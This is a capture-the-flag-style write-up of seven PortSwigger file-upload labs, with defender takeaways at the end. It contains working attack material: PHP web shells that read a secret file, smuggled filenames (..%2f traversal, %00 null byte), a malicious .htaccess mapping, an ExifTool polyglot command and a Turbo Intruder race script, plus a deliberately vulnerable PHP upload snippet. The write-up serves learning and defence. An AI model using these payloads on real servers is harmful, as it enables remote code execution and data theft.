# File Upload Vulnerabilities — PortSwigger Web Security Academy

**Author:** XENOS  
**Platform:** PortSwigger Web Security Academy  
**Category:** File Upload Vulnerabilities  
**Difficulty:** Apprentice → Practitioner  
**Labs Completed:** 7 / 7  
**Date:** March 2026

---

## Table of Contents

1. [What Are File Upload Vulnerabilities?](#what-are-file-upload-vulnerabilities)
2. [Lab 1 — No Validation (Apprentice)](#lab-1--remote-code-execution-via-web-shell-upload)
3. [Lab 2 — Content-Type Bypass (Apprentice)](#lab-2--web-shell-upload-via-content-type-restriction-bypass)
4. [Lab 3 — Path Traversal (Practitioner)](#lab-3--web-shell-upload-via-path-traversal)
5. [Lab 4 — Extension Blacklist + .htaccess (Practitioner)](#lab-4--web-shell-upload-via-extension-blacklist-bypass)
6. [Lab 5 — Null Byte Injection (Practitioner)](#lab-5--web-shell-upload-via-obfuscated-file-extension)
7. [Lab 6 — Polyglot File (Practitioner)](#lab-6--remote-code-execution-via-polyglot-web-shell-upload)
8. [Lab 7 — Race Condition (Expert)](#lab-7--web-shell-upload-via-race-condition)
9. [Comparison Table](#comparison-table)
9. [Key Takeaways](#key-takeaways)

---

## What Are File Upload Vulnerabilities?

File upload vulnerabilities occur when a web server allows users to upload files without sufficiently validating properties such as name, type, contents, or size. A poorly implemented upload function can allow an attacker to upload a server-side script (e.g., a PHP web shell) and execute it remotely — leading to **Remote Code Execution (RCE)**.

There are many layers where validation can fail:

- **No validation at all** — anything goes
- **Content-Type header check** — user-controlled, trivially bypassed
- **Extension blacklist** — can be bypassed with obfuscation or server config files
- **Magic bytes check** — bypassable via polyglot files
- **Race condition** — file exists briefly before deletion

Each lab in this series targets a different layer.

---

## Lab 1 — Remote Code Execution via Web Shell Upload

**Difficulty:** Apprentice  
**Vulnerability:** No validation whatsoever

### Concept

The server stores uploaded files directly without any checks. Uploading a `.php` file and requesting it causes the server to execute it as PHP code.

### Steps

**1.** Log in as `wiener:peter` and upload any image as avatar.

**2.** In Burp > Proxy > HTTP history, find:
```
GET /files/avatars/<image> HTTP/2
```
Send it to **Repeater**.

**3.** Upload `exploit.php` directly via the avatar upload form:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**4.** In Repeater, change the path to:
```
GET /files/avatars/exploit.php HTTP/2
```

**5.** Send — the server executes the PHP and returns Carlos's secret.

### Why It Works

No validation was implemented. The server treats every uploaded file identically regardless of extension or content.

---

## Lab 2 — Web Shell Upload via Content-Type Restriction Bypass

**Difficulty:** Apprentice  
**Vulnerability:** Trusting the user-supplied `Content-Type` header

### Concept

The server checks the `Content-Type` header to decide if the file is an image. Since this header is sent by the client, it can be freely manipulated in Burp.

### Steps

**1.** Upload `exploit.php` normally — server rejects it (only `image/jpeg` or `image/png` allowed).

**2.** Intercept the `POST /my-account/avatar` request in Burp and send it to Repeater.

**3.** In the multipart body, change:
```
Content-Type: application/x-php
```
to:
```
Content-Type: image/jpeg
```

**4.** Send — server accepts the file.

**5.** Request `GET /files/avatars/exploit.php` — secret returned.

### Why It Works

The server validated the `Content-Type` header without checking the actual file contents. The `Content-Type` in a multipart upload is client-controlled and cannot be trusted.

---

## Lab 3 — Web Shell Upload via Path Traversal

**Difficulty:** Practitioner  
**Vulnerability:** Directory traversal in filename parameter

### Concept

The server disables PHP execution in the `/files/avatars/` directory. However, the parent directory `/files/` executes PHP. By manipulating the `filename` parameter to traverse upward, we can place the file in an executable directory.

### Steps

**1.** Upload `exploit.php` — server accepts it but returns it as plain text (no execution).

**2.** In Burp Repeater, modify the `Content-Disposition` header:
```
filename="../exploit.php"
```
Server strips the traversal — still saves to `avatars/`.

**3.** URL-encode the slash to bypass the strip:
```
filename="..%2fexploit.php"
```

**4.** Server decodes the URL encoding **after** stripping, placing the file at:
```
/files/exploit.php
```

**5.** Request:
```
GET /files/avatars/..%2fexploit.php HTTP/2
```
or equivalently:
```
GET /files/exploit.php HTTP/2
```
Secret is returned.

### Why It Works

The server stripped `../` from filenames but did not strip `%2f` (URL-encoded `/`). After URL decoding, the traversal succeeded, placing the file one directory above `avatars/` where PHP execution was permitted.

---

## Lab 4 — Web Shell Upload via Extension Blacklist Bypass

**Difficulty:** Practitioner  
**Vulnerability:** Blacklist-based extension filtering + writable `.htaccess`

### Concept

The server blacklists `.php` extensions but allows uploading `.htaccess`. Apache reads `.htaccess` files and updates its configuration per-directory. By uploading a malicious `.htaccess` that maps a custom extension (`.l33t`) to the PHP MIME type, any file with that extension becomes executable.

### Steps

**1.** Attempt to upload `exploit.php` — rejected (`.php` is blacklisted).

**2.** In Burp Repeater, modify the POST request body:

```
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
```

Send — server accepts `.htaccess`.

**3.** Return to the same Repeater tab and change the body to:

```
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Send — `.l33t` is not on the blacklist, so it's accepted.

**4.** Request:
```
GET /files/avatars/exploit.l33t HTTP/2
```
Apache reads `.htaccess`, treats `.l33t` as PHP, executes the script, and returns the secret.

### Why It Works

```
Blacklist only blocked known PHP extensions
         ↓
.htaccess was not protected
         ↓
Apache re-reads .htaccess on every request
         ↓
Custom extension .l33t → executed as PHP
```

The root cause is using a **blacklist** instead of a **whitelist**. Any extension not explicitly banned is accepted — and `.htaccess` allowed redefining what "PHP" means for that directory.

---

## Lab 5 — Web Shell Upload via Obfuscated File Extension

**Difficulty:** Practitioner  
**Vulnerability:** Null byte injection in filename

### Concept

In C-based languages, the null byte (`\x00`) marks the end of a string. If the server's validation logic is written in a higher-level language (PHP, Java) but the underlying filesystem operation is C-based, a null byte embedded in the filename causes the two layers to "see" different strings.

### Steps

**1.** Attempt to upload `exploit.php` — rejected (only JPG/PNG allowed).

**2.** In Burp Repeater, change the filename parameter to:
```
filename="exploit.php%00.jpg"
```

**3.** Send — the validation layer sees `.jpg` and accepts the file. The server message confirms the file was saved as `exploit.php` (null byte and everything after it were stripped at the filesystem level).

**4.** Request:
```
GET /files/avatars/exploit.php HTTP/2
```
Secret is returned.

### Why It Works

```
"exploit.php%00.jpg"
        ↓ Validation reads:
".jpg"  ✅ accepted

        ↓ Filesystem (C-based) reads until \x00:
"exploit.php"  → saved and executed as PHP
```

The two layers had inconsistent string handling, creating a blind spot in the validation logic.

---

## Lab 6 — Remote Code Execution via Polyglot Web Shell Upload

**Difficulty:** Practitioner  
**Vulnerability:** Magic bytes validation — bypassable via polyglot file

### Concept

The server reads the actual file contents to verify it is a genuine image (magic bytes check). A **polyglot file** is valid for two formats simultaneously — it satisfies the image validator while also containing executable PHP code in the EXIF metadata.

### Tool Used

```
exiftool
```

### Steps

**1.** Attempting standard PHP upload and previous techniques all fail — the server validates file contents.

**2.** Create a polyglot PHP/JPEG file using ExifTool:
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" \
  input.jpg -o polyglot.php
```

Verify the output:
```bash
file polyglot.php
# polyglot.php: JPEG image data, JFIF standard 1.01 ... comment: "<?php echo ..."
```

The file starts with valid JPEG magic bytes (`FF D8 FF`) but carries PHP code in the Comment field.

**3.** Upload `polyglot.php` through the avatar form in the browser — accepted.

**4.** In Burp Proxy history, find:
```
GET /files/avatars/polyglot.php HTTP/2
```

**5.** The response is binary JPEG data, but within it:
```
START <carlos_secret> END
```

Submit the secret.

### Why It Works

```
Magic bytes:  FF D8 FF ...  ← JPEG validator sees a valid image ✅
EXIF Comment: <?php ... ?>  ← PHP interpreter executes this ✅
```

The server validated the format correctly, but the PHP engine does not care about image headers — it scans the entire file for `<?php` tags and executes whatever it finds.

---

## Lab 7 — Web Shell Upload via Race Condition

**Difficulty:** Expert  
**Vulnerability:** Race condition between file storage and validation

### Concept

The server performs validation **after** moving the file to its final destination. This creates a brief window where the malicious file exists on disk and is accessible — before the server deletes it.

The vulnerable PHP logic:

```php
$target_file = "avatars/" . $_FILES["avatar"]["name"];

// File saved FIRST — accessible immediately
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

// Validation happens AFTER
if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "uploaded.";
} else {
    unlink($target_file);  // deleted too late
    http_response_code(403);
}
```

The attack window:

```
POST upload exploit.php
        ↓
File saved to /files/avatars/exploit.php  ← window opens
        ↓
[virus check running...]
        ↓  ← GET request must hit here
File deleted by server                     ← window closes
```

### Tool Used

**Turbo Intruder** — Burp extension that sends multiple HTTP requests with millisecond-level synchronization using a gate mechanism.

### Steps

**1.** Install Turbo Intruder: **Burp > Extensions > BApp Store** → search "Turbo Intruder" → Install.

**2.** Log in and upload a normal image as avatar.

**3.** In Burp Proxy history, find `GET /files/avatars/<image>` and keep it for reference.

**4.** Attempt to upload `exploit.php`:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
Server rejects it — all previous bypass techniques fail too.

**5.** Find `POST /my-account/avatar` in Proxy history → right-click → **Extensions > Turbo Intruder > Send to Turbo Intruder**.

**6.** In the Turbo Intruder Python editor, paste this script:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''POST /my-account/avatar HTTP/2
Host: <YOUR-LAB-HOST>
Cookie: session=<YOUR-SESSION>
Content-Type: multipart/form-data; boundary=----boundary123
Content-Length: <LENGTH>

------boundary123
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------boundary123
Content-Disposition: form-data; name="user"

wiener
------boundary123
Content-Disposition: form-data; name="csrf"

<CSRF-TOKEN>
------boundary123--'''

    request2 = '''GET /files/avatars/exploit.php HTTP/2
Host: <YOUR-LAB-HOST>
Cookie: session=<YOUR-SESSION>

'''

    # Gate blocks all requests until openGate fires them simultaneously
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # All 6 requests fire at the same instant
    engine.openGate('race1')
    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

> Replace `<YOUR-LAB-HOST>`, `<YOUR-SESSION>`, and `<CSRF-TOKEN>` with real values from your proxy history.

**7.** Click **Attack** — Turbo Intruder fires 1 POST + 5 GET requests simultaneously.

**8.** In the results table, look for GET responses with status **200** — these hit the server during the race window. The response body contains Carlos's secret.

**9.** Submit the secret.

### Why It Works

The gate mechanism in Turbo Intruder is key:

```
All requests connect to server and send headers
              ↓
All requests pause — holding their final byte
              ↓
openGate() fires — all final bytes sent at once
              ↓
Server receives POST + 5 GETs nearly simultaneously
              ↓
POST saves file → at least 1 GET hits before deletion
```

Standard Burp Repeater cannot achieve this timing because requests are sent sequentially. Turbo Intruder synchronizes them at the TCP level.

### Why Previous Bypasses Failed

All six previous techniques manipulate **what** the server accepts. Here, the server's validation is actually correct — it properly rejects PHP files. The vulnerability is not in the validation logic but in the **order of operations**:

```
Secure order:  validate → save
Vulnerable order: save → validate   ← race window exists here
```

---

## Comparison Table

| Lab | Bypass Technique | Validation Defeated | Difficulty |
|-----|-----------------|---------------------|------------|
| 1 | Direct upload | None | Apprentice |
| 2 | Change Content-Type header | MIME type check | Apprentice |
| 3 | URL-encoded path traversal (`..%2f`) | Execution directory restriction | Practitioner |
| 4 | Upload `.htaccess` → map custom extension | Extension blacklist | Practitioner |
| 5 | Null byte injection (`%00`) | Extension whitelist | Practitioner |
| 6 | Polyglot file via ExifTool | Magic bytes / content validation | Practitioner |
| 7 | Race condition via Turbo Intruder | Correct validation — wrong order | Expert |

---

## Key Takeaways

**For attackers (Red Team perspective):**
- Always probe multiple bypass layers — even if one technique fails, combine them
- Server responses often leak backend info (Apache version, framework) that guides the next step
- Magic bytes validation is stronger than header checks, but polyglot files defeat it
- Race conditions can bypass even **correct** validation — the order of operations matters as much as the logic itself
- Turbo Intruder's gate mechanism allows synchronized multi-request attacks impossible with standard tools

**For defenders:**
- **Never use blacklists** for file extension validation — use strict whitelists
- Validate file contents (magic bytes) AND extension AND MIME type — all three
- Store uploaded files **outside the webroot** entirely
- Rename uploaded files server-side — never use the user-supplied filename
- Disable `.htaccess` overrides (`AllowOverride None` in Apache config)
- Run uploaded files through a sandboxed virus scanner before making them accessible
- **Validate before storing** — never save a file to an accessible location before completing all checks; use a temporary directory outside the webroot
- Use atomic file operations — validate in memory or in a sandboxed path, only move to final location after full approval

---

*Written by XENOS — learning in public, one shell at a time.*
